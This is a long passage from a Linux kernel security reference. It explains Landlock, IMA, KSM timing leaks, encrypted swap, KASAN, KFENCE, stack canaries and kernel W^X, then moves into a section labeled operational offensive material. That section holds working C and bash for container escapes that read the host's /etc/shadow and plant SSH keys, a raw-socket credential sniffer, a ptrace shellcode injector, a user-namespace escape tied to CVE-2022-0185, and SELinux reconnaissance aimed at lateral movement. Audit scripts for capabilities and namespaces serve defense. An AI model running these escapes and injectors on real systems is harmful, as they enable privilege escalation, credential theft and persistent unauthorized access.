**Landlock ABI versioning.** Landlock uses an explicit ABI version negotiation: `landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION)` returns the highest supported ABI version. Each ABI version adds new access rights: ABI 1 (Linux 5.13) introduced filesystem access rights; ABI 2 (Linux 5.19) added `LANDLOCK_ACCESS_FS_REFER` for cross-directory renames; ABI 3 (Linux 6.2) added file truncation control; ABI 4 (Linux 6.3) introduced network port binding and connecting rules. A well-written Landlock consumer checks the ABI version and adjusts its `handled_access_fs` mask to only include rights supported by the running kernel, enabling graceful degradation on older kernels.

**Landlock stacking with other LSMs.** Landlock operates independently of SELinux and AppArmor. An access must be allowed by all active security mechanisms: if SELinux allows a file read but Landlock denies it, the access is denied. This composability is a strength: a system can have a global SELinux policy for system services and per-application Landlock sandboxes that further restrict individual programs without modifying the system-wide policy.

### 5.8 IMA and the integrity subsystem

IMA (Integrity Measurement Architecture) provides file integrity measurement and enforcement. It hooks into the LSM framework at file-open time and:

**Measurement**: computes a hash of every file opened (or a configured subset, filtered by IMA policy rules) and extends a TPM PCR (Platform Configuration Register) with each hash. This creates an immutable log of all files executed/opened, which a remote verifier can attest against a known-good list.

**Appraisal**: compares the file's hash against a stored reference value (in `security.ima` extended attribute or in a signed policy) and denies access if the hash doesn't match. This provides runtime file integrity enforcement: a tampered binary fails the appraisal check and is not executed.

**Audit**: logs file hash measurements to the audit log.

IMA integrates with EVM (Extended Verification Module), which protects the integrity of security-relevant extended attributes (including the IMA hash, SELinux labels, and file capabilities) against tampering. EVM uses an HMAC key (stored in the TPM or kernel keyring) to sign extended attributes. When EVM is active, any modification to a protected xattr that doesn't match the HMAC is rejected.

IMA appraisal combined with a signed policy and TPM-backed EVM provides a measured and verified boot chain for user-space binaries: the kernel's Secure Boot verifies the kernel/initrd, IMA-appraisal verifies every binary executed thereafter, and the TPM records the measurement chain for remote attestation. This chain is used in confidential computing environments and in government deployments where software integrity must be continuously verified.

**IMA policy rules** control which files are measured and appraised. The policy is written to `/sys/kernel/security/ima/policy` (write-once unless `CONFIG_IMA_WRITE_POLICY` is set). Example rules:

```
# Measure all files executed
measure func=BPRM_CHECK
# Measure all shared libraries loaded
measure func=FILE_MMAP mask=MAY_EXEC
# Appraise all files executed (deny if hash mismatch)
appraise func=BPRM_CHECK
# Appraise all files opened by root
appraise func=FILE_CHECK uid=0
```

IMA supports multiple hash algorithms (`sha1`, `sha256`, `sha512`, `sm3`) and digital signatures (RSA, ECDSA) for appraisal references. When using signed IMA, the public key for verification is loaded into the kernel's `.ima` keyring at boot (from the initrd or built into the kernel), and the `security.ima` xattr on each file contains a digital signature over the file's hash. This prevents an attacker who gains write access from simply updating both the file and its hash — they would need the private signing key.

---

## 6. Kernel memory security: KSM, compression, swap, sanitizers, and pageattr

### 6.1 Kernel Same-page Merging (KSM)

KSM (`CONFIG_KSM`) scans memory regions marked with `MADV_MERGEABLE` and identifies pages with identical content. When duplicates are found, KSM maps all references to a single read-only physical page (with copy-on-write semantics on any subsequent write). This saves physical memory in virtualization environments where multiple VMs run the same OS and applications (substantial page sharing across guests). KSM runs as a kernel thread (`ksmd`) that periodically scans registered memory areas, comparing page contents via a red-black tree of page hashes.

**Side-channel implications.** KSM introduces a timing side channel: writing to a shared page triggers a COW fault (slow — involves page allocation, copying, and TLB invalidation), while writing to an unshared page does not (fast — only a store instruction). An attacker in one VM can fill a page with candidate content, mark it `MADV_MERGEABLE`, wait for KSM to merge it, then write to the page and time the write. A slow write (COW) indicates the page was merged, meaning another VM has a page with identical content. This was demonstrated as a practical cross-VM information leak (FLUSH+RELOAD on KSM-merged pages): an attacker could detect which shared libraries, configuration files, or even specific data pages are present in a co-resident VM. The attack was refined to detect individual bytes by constructing pages that differ in only one position.

The attack was further refined in several academic papers to demonstrate practical exploitation: detecting which browser a co-resident VM is running (by probing for unique constant pages in different browser binaries), identifying the operating system version (by probing for kernel or library data pages specific to a release), and even inferring user activity (by detecting whether certain application-specific data structures are present in memory).

KSM also has implications within a single host for container-to-container information leakage. Containers sharing a kernel (unlike VMs, which have separate kernels) have their anonymous pages managed by the same KSM instance. If KSM is enabled and containers use `MADV_MERGEABLE`, the same timing side channel applies between containers.

Mitigation: disable KSM in environments where cross-VM or cross-container information leakage is a concern. Many cloud providers (AWS, GCP) disable KSM by default on their hypervisors. The setting is `/sys/kernel/mm/ksm/run` (0 = disabled, 1 = enabled). The performance cost is real (reduced memory savings — KSM can save 20-50% of physical memory in dense VM environments) but the security tradeoff is clear for multi-tenant environments. A middle ground is to enable KSM only for trusted workloads (`MADV_MERGEABLE` is opt-in per-VMA) and ensure that security-sensitive VMs do not mark their memory as mergeable.

### 6.2 Memory compression: zswap and zram

**zswap**: a kernel module that intercepts pages being swapped out (at the frontswap layer) and compresses them into a dynamically-allocated in-memory pool. The pool uses a backing allocator — originally `zbud` (packs two compressed objects per page, ~50% memory efficiency) and now `zsmalloc` (more efficient packing for variable-size compressed objects, used by default). If the page compresses well, it stays in RAM (compressed); if the pool is full or the page compresses poorly, the least-recently-used compressed pages are written to the backing swap device. zswap reduces swap I/O at the cost of CPU cycles for compression. Compression algorithms include LZO, LZ4 (fast, lower ratio), and zstd (slower, better ratio).

**zram**: creates a compressed block device in RAM (`/dev/zram0`). Pages written to the zram device are compressed and stored in memory using `zsmalloc`. Unlike zswap, zram is a complete swap device (you `mkswap`/`swapon` on `/dev/zram0`); there is no backing disk. Used on memory-constrained systems (Android, ChromeOS, Fedora desktop) where swap to disk is undesirable or unavailable. zram also supports write-back (flushing cold compressed pages to a backing disk device) for hybrid configurations.

Security note: compressed pages in zswap/zram are still in physical memory and accessible to the kernel. They don't provide confidentiality — a kernel exploit that can read physical memory (via the direct map) can read compressed pages. The compression algorithm (LZO, LZ4, or zstd) is not encryption. In a threat model where kernel memory compromise is possible, compressed swap is not a security boundary.

An additional consideration is that compression ratios can leak information about page content. A page of zeros compresses to nearly nothing; a page of random bytes (e.g., an encryption key or PRNG state) compresses poorly. An attacker who can observe the zswap pool size or zram statistics (`/sys/block/zram0/compr_data_size` vs `orig_data_size`) may infer properties of the memory being compressed. This is a theoretical concern and has not been demonstrated as a practical attack, but it falls into the broader category of compression oracle attacks (analogous to CRIME/BREACH in TLS).

### 6.3 Encrypted swap

Sensitive data swapped to disk is vulnerable to offline recovery (power off the machine, read the swap partition). Encrypted swap mitigates this by encrypting pages before writing them to the swap device.

Two approaches: encrypt the swap partition at the block layer (dm-crypt/LUKS on the swap device — the standard approach) or use per-page encryption.

With `dm-crypt`: `cryptsetup` creates an encrypted block device over the raw swap partition. The encryption key can be derived from a passphrase or be random-per-boot (if the swap contents don't need to survive reboot — which they usually don't). Random-per-boot with `mkswap` on the encrypted device gives forward secrecy: old swap data is irrecoverable after reboot because the encryption key is lost.

```bash
# Random-per-boot encrypted swap (key generated fresh each boot)
# In /etc/crypttab:
# cryptswap /dev/sdX2 /dev/urandom swap,cipher=aes-xts-plain64,size=256
#
# In /etc/fstab:
# /dev/mapper/cryptswap none swap sw 0 0
```

This matters because sensitive data — including cryptographic keys, passwords in memory, decrypted file contents, and heap data from security-sensitive applications — can end up in swap. Without encrypted swap, an attacker with physical access to the disk can recover this data even if the system uses full-disk encryption on its root partition (the swap partition is a separate device). Applications that handle cryptographic material should also use `mlock()` (gated by `CAP_IPC_LOCK` or `RLIMIT_MEMLOCK`) to prevent their key pages from being swapped at all — encrypted swap is the fallback when `mlock` is not feasible.

A related concern is hibernation (`suspend-to-disk`): the kernel writes the entire contents of RAM (including all process memory, kernel structures, and decrypted secrets) to the swap device. If the swap device is not encrypted, the hibernation image is a complete memory dump recoverable by an offline attacker. The `CONFIG_SECURITY_LOCKDOWN_LSM` in integrity mode restricts hibernation for this reason.

### 6.4 KFENCE — kernel fence for use-after-free and out-of-bounds detection

KFENCE (Kernel Electric Fence, `CONFIG_KFENCE`, Linux 5.12+) is a low-overhead, sampling-based memory error detector for production kernels. It works by placing a subset of heap allocations into a dedicated pool of guard-page-separated slots. Each allocation is bounded by unmapped guard pages; any out-of-bounds access triggers a page fault. When an allocation is freed, its page is unmapped (poisoned), and any subsequent use-after-free access also triggers a fault.

KFENCE does not instrument all allocations (unlike KASAN). Instead, it samples: every N allocations (controlled by `kfence.sample_interval`, defaulting to 100ms), one allocation is redirected to the KFENCE pool. This gives probabilistic coverage with near-zero performance impact (typically < 1%), making KFENCE suitable for production deployments where KASAN's overhead (2-3x) is unacceptable.

When KFENCE detects an error, it produces a detailed report including the offending access address, the allocation and free stack traces, and the type of error (out-of-bounds read/write, use-after-free, double-free, invalid-free). The report is emitted via `printk` and captured in `dmesg` / the audit log.

KFENCE complements another production hardening feature: `init_on_alloc` and `init_on_free` (boot parameters or `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` / `CONFIG_INIT_ON_FREE_DEFAULT_ON`). When enabled, `init_on_alloc` zeroes all heap allocations from the slab allocator, eliminating information leaks from uninitialized memory. `init_on_free` zeroes memory when it's freed, eliminating use-after-free information leaks (the freed object contains zeros instead of stale data). The performance overhead is modest (1-3% on typical workloads) and both are increasingly enabled by default in security-focused distributions. Together with KFENCE, these features address the two most common classes of kernel memory bugs: use of uninitialized memory and use of freed memory.

### 6.5 KASAN — Kernel AddressSanitizer

KASAN (`CONFIG_KASAN`) is a comprehensive kernel memory error detector. It detects out-of-bounds accesses (heap, stack, global), use-after-free, use-after-scope, and double-free bugs. KASAN exists in three modes:

**Generic KASAN** (`CONFIG_KASAN_GENERIC`): uses shadow memory — every 8 bytes of kernel memory has a corresponding 1-byte shadow that encodes whether the memory is valid and how many bytes at the end of the 8-byte group are accessible. The compiler instruments every memory load and store with a shadow check. Overhead: 1/8 of kernel memory for shadow + significant CPU overhead from instrumentation. Typically 2-3x slowdown. Used in development and CI, not production.

**Software Tag-Based KASAN** (`CONFIG_KASAN_SW_TAGS`): uses the ARM64 Top Byte Ignore (TBI) feature. Assigns random tags to memory allocations and stores the expected tag in the top byte of pointers. On memory access, the instrumentation compares the pointer's tag with the memory's shadow tag. Detects the same class of errors with lower memory overhead (smaller shadow). ARM64-only.

**Hardware Tag-Based KASAN** (`CONFIG_KASAN_HW_TAGS`): uses ARM Memory Tagging Extension (MTE). The hardware checks tags on every memory access with zero software instrumentation overhead. Fastest mode, hardware-dependent (ARMv8.5-A+ with MTE support). This is the path toward production-grade KASAN with negligible performance cost.

KASAN is invaluable for security because the bugs it detects (heap overflow, UAF, stack overflow) are the exact primitives used in kernel exploits. Many CVEs (including CVE-2022-0185, CVE-2022-0492's underlying memory issues, and hundreds of others) would have been caught during development if KASAN were enabled in the testing pipeline. The kernel's continuous integration (syzbot, run by Google) runs with KASAN enabled, which is why syzbot discovers a disproportionate number of memory safety bugs. The typical KASAN report includes the access type (read/write), the faulting address, the shadow memory state, and full allocation and deallocation stack traces when the object was a heap allocation — providing everything needed to reproduce and fix the bug.

### 6.6 Stack protector (kernel stack canaries)

The kernel stack protector (`CONFIG_STACKPROTECTOR`, `CONFIG_STACKPROTECTOR_STRONG`) inserts a random canary value between a function's local variables and its saved return address on the stack. Before the function returns, the compiler-inserted epilogue checks that the canary has not been modified. If it has (indicating a stack buffer overflow that corrupted the return address), the kernel calls `__stack_chk_fail`, which triggers a kernel panic rather than allowing the attacker to hijack control flow.

`CONFIG_STACKPROTECTOR` instruments functions with character arrays or `alloca` calls. `CONFIG_STACKPROTECTOR_STRONG` extends instrumentation to all functions with local array variables, address-taken local variables, or variable-length arrays — covering a much broader set of potentially vulnerable functions. The canary value is stored per-CPU in `__stack_chk_guard` (or in the `stack_canary` field of `struct thread_info` / `current_task` depending on architecture) and is randomized at boot.

The stack protector is a mitigation, not a prevention: it detects stack buffer overflows after they occur (when the function returns) but before the attacker gains control flow. An attacker who can overwrite memory precisely (skipping the canary) or who leaks the canary value can bypass this protection. Despite this, stack protector stops a large class of unsophisticated stack-based exploits and is considered a baseline defense.

Canary bypass techniques: (1) information leak — if an attacker can read the canary value (e.g., via a format string vulnerability or a partial overread), they can include the correct canary in their overflow payload; (2) adjacent write — if the vulnerability allows writing to non-contiguous memory (e.g., an array index out-of-bounds rather than a linear overflow), the attacker can skip over the canary and modify the return address directly; (3) exception-based bypass — if the overflowed function throws an exception (C++ or kernel `oops` handler) before the epilogue canary check, the corrupted return address may be used during stack unwinding. Linux kernel panics on stack canary corruption (rather than attempting recovery), which eliminates the exception-based bypass but converts the exploit into a denial-of-service.

Related kernel stack hardening features include `CONFIG_VMAP_STACK` (Linux 4.9+), which allocates each kernel thread's stack from vmalloc space with guard pages on both sides. A stack overflow hits the guard page and faults immediately, rather than silently corrupting adjacent memory. Without `VMAP_STACK`, kernel stacks are allocated from the direct-mapped region with no guard pages, and a stack overflow corrupts whatever data structure happens to be adjacent in physical memory — often another task's `thread_info` or a slab cache, providing a direct path to privilege escalation.

### 6.7 The `pageattr` mechanism

The kernel's `pageattr` system (`arch/x86/mm/pat/set_memory.c`) provides functions to change page-table permissions on kernel-space memory at runtime: `set_memory_ro`, `set_memory_rw`, `set_memory_nx`, `set_memory_x`, `set_memory_uc` (uncacheable), `set_memory_wb` (write-back). On ARM64, the equivalent is in `arch/arm64/mm/pageattr.c`.

These functions modify the page table entries for the specified virtual address range, splitting large pages (2MB/1GB) into 4KB pages if necessary to apply fine-grained permissions. TLB flushes are performed to ensure the new permissions take effect immediately.

These are used internally to:

- Make kernel text read-only and executable (`set_memory_ro` + `set_memory_x`) after boot, preventing runtime modification of kernel code. Controlled by `CONFIG_STRICT_KERNEL_RWX`.
- Make kernel rodata (read-only data) non-executable (`set_memory_nx`). Controlled by `CONFIG_STRICT_KERNEL_RWX`.
- Make module text read-only after load (`CONFIG_STRICT_MODULE_RWX`).
- Mark freed init memory as non-executable and non-readable (reclaimed after boot).
- Temporarily make kernel text writable for live patching (kpatch/livepatch) and then re-lock it.
- Enforce W^X (write XOR execute): no kernel memory region is simultaneously writable and executable.

The combination of `STRICT_KERNEL_RWX` + `STRICT_MODULE_RWX` + module signing + `CONFIG_SECURITY_LOCKDOWN_LSM` (which restricts operations that could modify the running kernel) provides a defense-in-depth chain against runtime kernel code modification:

1. Module loading requires a valid signature (`CONFIG_MODULE_SIG_FORCE`).
2. Loaded module text becomes read-only (`STRICT_MODULE_RWX`).
3. Kernel text is read-only (`STRICT_KERNEL_RWX`).
4. `/dev/mem` and `/dev/kmem` are restricted (`STRICT_DEVMEM`).
5. Hibernation (which writes kernel memory to disk where it could be modified) is restricted.
6. The `lockdown` LSM prevents userspace from writing to kernel memory through any remaining interfaces (`/dev/mem`, `iopl`, `ioperm`, `kexec_load` with unsigned images, `bpf_write_user` from BPF programs, and access to MSRs).
7. `CONFIG_DEBUG_RODATA_TEST` (development option) verifies at boot that the RO/NX permissions are correctly applied.

The `lockdown` LSM has two modes: `integrity` (prevents modifications to the running kernel — blocks unsigned module loading, `/dev/mem` write access, raw port I/O, MSR writes, and hibernation) and `confidentiality` (additionally prevents reading kernel memory — blocks `/dev/mem` reads, `/proc/kcore`, BPF reads from kernel memory, and `perf_event_open` with kernel-mode sampling). The mode is set at boot via the `lockdown=` parameter and can be raised (but never lowered) at runtime via `/sys/kernel/security/lockdown`. On UEFI Secure Boot systems, the kernel automatically activates `lockdown=integrity` to maintain the Secure Boot trust chain into the running system.

The W^X invariant enforced by `pageattr` is the kernel-side complement of the userspace W^X enforced by the kernel's `mmap`/`mprotect` checks (when `CONFIG_ARCH_MMAP_RND_BITS` is set and SELinux/AppArmor deny `mprotect PROT_EXEC` on writable mappings). Together, they ensure that neither kernel nor userspace can create memory that is simultaneously writable and executable, closing the most straightforward code injection vector at both privilege levels.

---

## Offensive, Detection, and Hardening — §§6A–6G

> The following subsections cover exploitation techniques, detection signatures, and hardening configurations for the mechanisms described in §§1–6. Theory and architecture are in the sections above; the material below is operational.

### 6A. Capability exploitation

**C: `capget`/`capset` — reading and manipulating capability sets.**

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/capability.h>   /* -lcap */
#include <sys/prctl.h>
#include <unistd.h>
#include <linux/capability.h>

/* Raw capget/capset using syscall interface */
void dump_caps(pid_t pid) {
    struct __user_cap_header_struct hdr = {
        .version = _LINUX_CAPABILITY_VERSION_3,
        .pid     = pid,
    };
    struct __user_cap_data_struct data[2];  /* v3 uses 2 __u32 per set */

    if (capget(&hdr, data) < 0) {
        perror("capget");
        return;
    }
    printf("PID %d capabilities:\n", pid ? pid : getpid());
    printf("  Effective:   0x%08x%08x\n", data[1].effective,   data[0].effective);
    printf("  Permitted:   0x%08x%08x\n", data[1].permitted,   data[0].permitted);
    printf("  Inheritable: 0x%08x%08x\n", data[1].inheritable, data[0].inheritable);
}

/* Raise CAP_NET_RAW into effective set (must already be in permitted) */
int raise_cap_net_raw(void) {
    struct __user_cap_header_struct hdr = {
        .version = _LINUX_CAPABILITY_VERSION_3,
        .pid     = 0,  /* self */
    };
    struct __user_cap_data_struct data[2];

    if (capget(&hdr, data) < 0) return -1;

    /* CAP_NET_RAW = 13 → bit 13 in data[0] */
    data[0].effective |= (1u << 13);
    return capset(&hdr, data);
}
```

**CAP_SYS_ADMIN container escape via mount namespace.** A container holding `CAP_SYS_ADMIN` can mount the host block device (if visible in `/dev`) and access the host filesystem. The device controller must also be misconfigured or absent for the device node to be accessible.

```c
#include <stdio.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
    /* Step 1: create mount point inside container */
    mkdir("/mnt/hostfs", 0755);

    /* Step 2: mount host disk — requires CAP_SYS_ADMIN + device access */
    if (mount("/dev/sda1", "/mnt/hostfs", "ext4", MS_RDONLY, NULL) < 0) {
        perror("mount");
        return 1;
    }

    /* Step 3: read sensitive host file */
    FILE *f = fopen("/mnt/hostfs/etc/shadow", "r");
    if (f) {
        char buf[256];
        while (fgets(buf, sizeof(buf), f))
            printf("%s", buf);
        fclose(f);
    }

    /* Step 4: write SSH key for persistent access */
    /* mkdir -p /mnt/hostfs/root/.ssh && write authorized_keys */

    umount("/mnt/hostfs");
    return 0;
}
```

**CAP_NET_RAW — passive credential sniffing.** Opens a raw socket on the container's interface and captures packets:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <unistd.h>

int main(void) {
    /* Requires CAP_NET_RAW */
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return 1; }

    unsigned char buf[65536];
    while (1) {
        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
        if (n < 0) break;
        /* Parse Ethernet → IP → TCP, extract HTTP auth headers, etc. */
        printf("captured %zd bytes\n", n);
    }
    close(sock);
    return 0;
}
```

**CAP_DAC_OVERRIDE — arbitrary file read.** A process with this capability bypasses all DAC read/write/execute checks on regular files:

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(void) {
    /* CAP_DAC_OVERRIDE bypasses permission checks */
    int fd = open("/etc/shadow", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        write(STDOUT_FILENO, buf, n);
    close(fd);
    return 0;
}
```

**CAP_SYS_PTRACE — process injection.** Attaching to a target process and injecting shellcode via `PTRACE_POKETEXT`:

```c
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

int inject_shellcode(pid_t target, unsigned long addr,
                     const unsigned char *code, size_t len) {
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0)
        return -1;
    waitpid(target, NULL, 0);

    /* Write shellcode word-by-word */
    for (size_t i = 0; i < len; i += sizeof(long)) {
        long word = 0;
        for (size_t j = 0; j < sizeof(long) && i + j < len; j++)
            ((unsigned char *)&word)[j] = code[i + j];
        if (ptrace(PTRACE_POKETEXT, target, addr + i, word) < 0)
            return -1;
    }

    /* Redirect instruction pointer to injected code */
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    regs.rip = addr;
    ptrace(PTRACE_SETREGS, target, NULL, &regs);

    ptrace(PTRACE_DETACH, target, NULL, NULL);
    return 0;
}
```

**Ambient capability abuse.** A parent with `CAP_NET_BIND_SERVICE` in permitted + inheritable can raise it into the ambient set, so unprivileged child binaries (without file capabilities) inherit it across `execve`:

```c
#include <sys/prctl.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
    /* Cap must be in both P and I to be raised into A */
    /* Assume cap_net_bind_service is already in P and I */

    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, 10 /* CAP_NET_BIND_SERVICE */, 0, 0) < 0) {
        perror("PR_CAP_AMBIENT_RAISE");
        return 1;
    }
    /* Child exec'd from here inherits CAP_NET_BIND_SERVICE
       even without file capabilities on the child binary.
       Attack vector: malicious parent sets ambient caps so any
       child (including unrelated binaries) gains capabilities. */

    char *argv[] = {"/usr/bin/python3", "-c",
        "import socket; s=socket.socket(); s.bind(('',80)); print('bound port 80')",
        NULL};
    execve(argv[0], argv, NULL);
    return 1;
}
```

**Python capability audit script.** Enumerates processes and file capabilities, flags dangerous configurations:

```python
#!/usr/bin/env python3
"""cap_audit.py — Audit capabilities on processes and binaries."""
import os, re, struct, subprocess, sys

DANGEROUS_CAPS = {
    21: "CAP_SYS_ADMIN",   16: "CAP_SYS_MODULE",  17: "CAP_SYS_RAWIO",
    19: "CAP_SYS_PTRACE",   1: "CAP_DAC_OVERRIDE",  2: "CAP_DAC_READ_SEARCH",
    13: "CAP_NET_RAW",      7: "CAP_SETUID",         6: "CAP_SETGID",
    32: "CAP_MAC_OVERRIDE", 39: "CAP_BPF",
}

def decode_hex_caps(hexval):
    val = int(hexval, 16)
    return {bit: name for bit, name in DANGEROUS_CAPS.items() if val & (1 << bit)}

def audit_processes():
    print("=== Process Capability Audit ===")
    findings = []
    for pid_dir in sorted(os.listdir("/proc")):
        if not pid_dir.isdigit():
            continue
        try:
            status = open(f"/proc/{pid_dir}/status").read()
            comm = re.search(r"^Name:\s+(.+)$", status, re.M)
            cap_eff = re.search(r"^CapEff:\s+(\S+)$", status, re.M)
            if not cap_eff:
                continue
            caps = decode_hex_caps(cap_eff.group(1))
            if caps:
                name = comm.group(1) if comm else "?"
                findings.append((pid_dir, name, caps))
        except (PermissionError, FileNotFoundError):
            continue
    for pid, name, caps in findings:
        cap_str = ", ".join(caps.values())
        print(f"  [!] PID {pid:>7s} ({name:>20s}): {cap_str}")
    if not findings:
        print("  No processes with dangerous effective capabilities found.")

def audit_file_caps(search_paths=("/usr", "/bin", "/sbin", "/opt")):
    print("\n=== File Capability Audit ===")
    for path in search_paths:
        if not os.path.isdir(path):
            continue
        try:
            result = subprocess.run(
                ["getcap", "-r", path],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.strip().splitlines():
                if any(d.lower().replace("cap_", "") in line.lower()
                       for d in DANGEROUS_CAPS.values()):
                    print(f"  [!] {line}")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            continue

def audit_ambient():
    print("\n=== Ambient Capability Check ===")
    try:
        status = open("/proc/self/status").read()
        cap_amb = re.search(r"^CapAmb:\s+(\S+)$", status, re.M)
        if cap_amb and int(cap_amb.group(1), 16) != 0:
            caps = decode_hex_caps(cap_amb.group(1))
            print(f"  [!] Current process has ambient caps: "
                  f"{', '.join(caps.values())}")
        else:
            print("  Ambient capabilities clear.")
    except Exception as e:
        print(f"  Error: {e}")

if __name__ == "__main__":
    audit_processes()
    audit_file_caps()
    audit_ambient()
```

### 6B. Namespace exploitation

**Container escape via user namespace — `unshare` + mount.** An unprivileged user creates a user namespace, gains `CAP_SYS_ADMIN` within it, and mounts a filesystem. This is the primitive exploited by CVE-2022-0185 (see §3.4 for the heap overflow details):

```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>

static void write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) { perror(path); exit(1); }
    write(fd, data, strlen(data));
    close(fd);
}

int main(void) {
    pid_t pid = getpid();
    char buf[256];

    /* Step 1: create user namespace — unprivileged */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        perror("unshare");
        return 1;
    }

    /* Step 2: set up UID/GID mapping */
    snprintf(buf, sizeof(buf), "/proc/%d/setgroups", pid);
    write_file(buf, "deny");
    snprintf(buf, sizeof(buf), "/proc/%d/uid_map", pid);
    write_file(buf, "0 1000 1");  /* map uid 0 inside → uid 1000 outside */
    snprintf(buf, sizeof(buf), "/proc/%d/gid_map", pid);
    write_file(buf, "0 1000 1");

    /* Step 3: now have CAP_SYS_ADMIN inside the user ns */
    /* Make mount tree private to prevent propagation */
    mount("", "/", NULL, MS_REC | MS_PRIVATE, NULL);

    /* Step 4: mount proc or other fs using namespace privileges */
    mkdir("/tmp/ns_escape", 0755);
    if (mount("proc", "/tmp/ns_escape", "proc", 0, NULL) == 0) {
        printf("[+] Mounted proc inside user namespace\n");
        /* Access to /tmp/ns_escape/1/root gives host PID 1's root fs
           if PID namespace is shared */
    }

    /* CVE-2022-0185 trigger used fsconfig() here with an oversized
       parameter to corrupt the heap — see §3.4 for the full chain */

    return 0;
}
```

**PID namespace escape via `nsenter` + `/proc/1/root`.** If a container shares the host's PID namespace (`--pid=host`), the container can access the host filesystem through `/proc/1/root`:

```bash
#!/bin/bash
# PID namespace escape — requires --pid=host or CAP_SYS_PTRACE
# /proc/1/root points to host PID 1's root filesystem

if [ -d /proc/1/root/etc ]; then
    echo "[+] Host filesystem accessible via /proc/1/root"
    cat /proc/1/root/etc/hostname
    cat /proc/1/root/etc/shadow 2>/dev/null && echo "[!] shadow readable"

    # Write SSH key for persistent access
    mkdir -p /proc/1/root/root/.ssh 2>/dev/null
    # echo "ssh-ed25519 AAAA... attacker@host" >> /proc/1/root/root/.ssh/authorized_keys
fi
```

**Network namespace pivot.** Entering the host's network namespace from a container that can access `/proc/1/ns/net`:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
    int fd = open("/proc/1/ns/net", O_RDONLY);
    if (fd < 0) { perror("open ns/net"); return 1; }

    if (setns(fd, CLONE_NEWNET) < 0) {
        perror("setns");
        close(fd);
        return 1;
    }
    close(fd);

    printf("[+] Entered host network namespace\n");
    /* Now have access to host interfaces, routing, iptables */
    execlp("ip", "ip", "addr", "show", NULL);
    return 1;
}
```

**Mount namespace filesystem escape.** Exploiting shared mount propagation — if the container's mount namespace has `shared` propagation with the host:

```bash
#!/bin/bash
# Check mount propagation — 'shared' is the escape condition
grep "shared" /proc/self/mountinfo && echo "[!] Shared propagation detected"

# If shared: mount a FUSE or bind-mount inside container
# and it appears on the host
# mount --bind /malicious /mnt/shared_mount → visible on host
```

**CVE-2022-0185 exploitation flow.** The full chain is documented in §3.4. Summary of the exploitation mechanics: (1) create user namespace via `unshare(CLONE_NEWUSER)` — unprivileged; (2) gain `CAP_SYS_ADMIN` within the namespace; (3) call `fsopen("ext4")` to create a filesystem context; (4) call `fsconfig(fd, FSCONFIG_SET_STRING, "\x00", long_value, 0)` with a parameter exceeding the `legacy_parse_param` buffer — triggers heap buffer overflow in `fs/fs_context.c`; (5) corrupt adjacent heap objects to gain arbitrary kernel write; (6) overwrite `cred->uid` or `modprobe_path` for root in the init namespace. The patch added length validation in `legacy_parse_param()`.

**Namespace enumeration script:**

```bash
#!/bin/bash
# ns_enum.sh — Enumerate namespace isolation gaps
echo "=== Namespace Enumeration ==="

echo -e "\n--- Current namespace membership ---"
ls -la /proc/self/ns/

echo -e "\n--- Comparing with host (PID 1) ---"
for ns in cgroup ipc mnt net pid user uts; do
    self_ns=$(readlink /proc/self/ns/$ns 2>/dev/null)
    host_ns=$(readlink /proc/1/ns/$ns 2>/dev/null)
    if [ "$self_ns" = "$host_ns" ]; then
        echo "[!] SHARED: $ns namespace matches host PID 1"
    else
        echo "[ok] Isolated: $ns"
    fi
done

echo -e "\n--- User namespace UID mapping ---"
cat /proc/self/uid_map 2>/dev/null

echo -e "\n--- Active namespaces (lsns) ---"
lsns 2>/dev/null || echo "(lsns not available)"

echo -e "\n--- Mount propagation ---"
grep -c "shared:" /proc/self/mountinfo
echo "mounts with shared propagation"

echo -e "\n--- User namespaces count ---"
cat /proc/sys/user/max_user_namespaces 2>/dev/null
```

### 6C. SELinux / AppArmor exploitation

**SELinux reconnaissance with `sesearch` / `seinfo` / `audit2allow`:**

```bash
# List all types in loaded policy
seinfo -t | head -30

# List all permissive domains — targets for lateral movement
seinfo -t | xargs -I{} sesearch -A --type {} 2>/dev/null | grep permissive
# Or directly:
semanage permissive -l

# Find all allow rules for a compromised domain
sesearch -A -s httpd_t          # all allow rules where httpd_t is source
sesearch -A -s httpd_t -c file  # file-class rules only
sesearch -A -s httpd_t -t shadow_t  # can httpd_t access shadow_t?

# Find domain transitions reachable from current domain
sesearch -T -s httpd_t          # type_transition rules

# After triggering denials in permissive mode, generate allow rules
audit2allow -i /var/log/audit/audit.log -M mypolicy
# Review generated module BEFORE installing:
cat mypolicy.te
# Install if appropriate:
semodule -i mypolicy.pp

# List enabled booleans — misconfigurations here widen attack surface
getsebool -a | grep " on$"
# Dangerous booleans to check:
getsebool httpd_can_network_connect   # allows outbound TCP
getsebool httpd_execmem               # allows W+X memory
getsebool container_manage_cgroup     # container cgroup write
```

**SELinux bypass patterns:**

